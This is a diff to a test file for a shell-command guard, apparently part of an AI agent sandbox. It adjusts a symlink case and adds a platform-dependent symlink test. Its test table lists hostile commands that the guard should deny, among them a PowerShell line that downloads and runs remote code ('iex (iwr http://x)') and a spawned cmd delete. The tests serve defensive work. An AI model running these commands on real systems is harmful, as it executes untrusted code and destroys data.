@@ -2,7 +2,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import type { Decision, Grant } from '../src/guard/types.js';
-import { ctxFor, fileCall, makeProject, run, sh, type Project } from './helpers.js';
+import { ctxFor, fileCall, makeProject, run, sh, shellCall, type Project } from './helpers.js';
 
 let proj: Project;
 beforeAll(() => {
@@ -356,7 +356,9 @@ describe('powershell and cmd', () => {
       ['& $cmd x', 'deny', 'unparseable'],
       ['iex (iwr http://x)', 'deny'],
       ['Start-Process cmd -ArgumentList "/c del x"', 'deny'],
-      ['New-Item -ItemType SymbolicLink -Path l -Target C:\\x', 'deny', 'symlinks'],
+      // The target stays inside the project: `C:\x` is an absolute path outside it on Windows, so the
+      // boundary guard fires first there. That case is covered separately below.
+      ['New-Item -ItemType SymbolicLink -Path l -Target x', 'deny', 'symlinks'],
       ['git status', 'allow'],
       ['git push', 'deny'],
       ['Get-ChildItem', 'ask'],
@@ -381,4 +383,12 @@ describe('powershell and cmd', () => {
     ],
     'cmd',
   );
+
+  it('a symlink to an absolute target is denied, and the symlinks guard always fires', () => {
+    // Which guard is reported first depends on the platform (`C:\x` is outside the project only on Windows).
+    const ctx = ctxFor(proj.root, 'strict');
+    const r = run(ctx, shellCall(ctx.root, 'New-Item -ItemType SymbolicLink -Path l -Target C:\\x', 'powershell'));
+    expect(r.verdict.decision).toBe('deny');
+    expect(r.candidates.map((c) => c.guard)).toContain('symlinks');
+  });
 });
